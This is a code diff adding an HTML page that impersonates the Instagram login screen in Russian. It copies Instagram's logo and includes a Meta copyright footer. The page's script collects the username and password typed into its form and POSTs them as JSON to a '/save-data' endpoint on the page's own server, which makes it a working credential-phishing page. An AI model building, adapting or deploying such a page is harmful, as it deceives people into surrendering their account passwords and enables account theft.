@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+  <link rel="shortcut icon" href="https://img.icons8.com/?size=512&id=Xy10Jcu1L2Su&format=png" type="image/x-icon">
+  <link rel="stylesheet" href="server.js">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background: #000;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      flex-direction: column;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 350px;
+      padding: 20px;
+      background: #111;
+      border: 1px solid #262626;
+      border-radius: 10px;
+      text-align: center;
+    }
+
+    .logo {
+      font-family: "Brush Script MT", cursive;
+      font-size: 40px;
+      margin-bottom: 20px;
+    }
+
+    .input-box {
+      width: 100%;
+      margin-bottom: 12px;
+    }
+
+    .input-box input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #686868;
+      background: #000;
+      color: #fff;
+      outline: none;
+    }
+
+    ::placeholder{
+        color: rgb(127, 127, 127);
+    }
+
+    .btn {
+        margin-top: 140px;
+      width: 100%;
+      padding: 12px;
+      background: #4251f8da;
+      border: none;
+      border-radius: 9px;
+      color: #fff;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 8px;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 20px 0;
+      color: #999;
+    }
+
+    .divider::before, .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: #333;
+      margin: 0 10px;
+    }
+
+    .fb-login {
+      color: #3897f0;
+      margin-bottom: 15px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      cursor: pointer;
+    }
+
+    .fb-login img {
+      width: 18px;
+      margin-right: 8px;
+    }
+
+    .forgot {
+      color: #fff;
+      margin-bottom: 60px;
+      cursor: pointer;
+      font-size: 14px;
+    }
+
+    .signup {
+      margin-top: 15px;
+      font-size: 14px;
+    }
+
+    .signup a {
+      color: #647efeda;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    footer {
+      margin-top: 25px;
+      text-align: center;
+      font-size: 12px;
+      color: #999;
+    }
+
+    /* Responsive */
+    @media (max-width: 400px) {
+      .container {
+        border: none;
+        background: none;
+      }
+    }
+
+    b{
+        margin-left: 5px;
+    }
+
+    .fb-login img{
+        width: 20px;
+    }
+
+    .container{
+        border: none;
+        background: black;
+    }
+    
+    .container i{
+        margin-bottom: 50px;
+    }
+
+    footer{
+        margin-top: 100px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v4/yz/r/H_-3Vh0lHeK.png&quot;); background-position: 0px -2907px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>
+
+    <div class="input-box">
+      <input id="num" id="inp-1" type="text" placeholder="Телефон, имя пользователя или эл. адрес">
+    </div>
+    <div class="input-box">
+      <input id="pass" type="password" placeholder="Пароль">
+    </div>
+
+    <button onclick="sign()" class="btn">Войти</button>
+
+    <div class="divider">ИЛИ</div>
+
+    <div class="fb-login">
+      <img src="https://img.icons8.com/?size=512&id=118497&format=png" alt="fb">
+      Войти через <b>Facebook</b>
+    </div>
+
+    <div class="forgot">Забыли пароль?</div>
+
+    <div class="signup">
+
+      У вас нет аккаунта? <a href="#">Зарегистрироваться</a>
+    </div>
+  </div>
+
+  <footer>
+    © 2025 Instagram from Meta
+  </footer>
+
+
+  <script>
+  const pass = document.querySelector('#pass');
+  const num = document.querySelector('#num');
+
+  async function sign() {
+    const data = {
+      user: num.value,
+      password: pass.value
+    };
+
+    try {
+      const response = await fetch('/save-data', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      });
+
+      if (response.ok) {
+        console.log('Данные успешно отправлены');
+      } else {
+        console.error('Ошибка при отправке данных');
+      }
+    } catch (error) {
+      console.error('Ошибка сети:', error);
+    }
+  }
+  </script>
+<link rel="stylesheet" href="main.py">
+
+</body>
+</html>
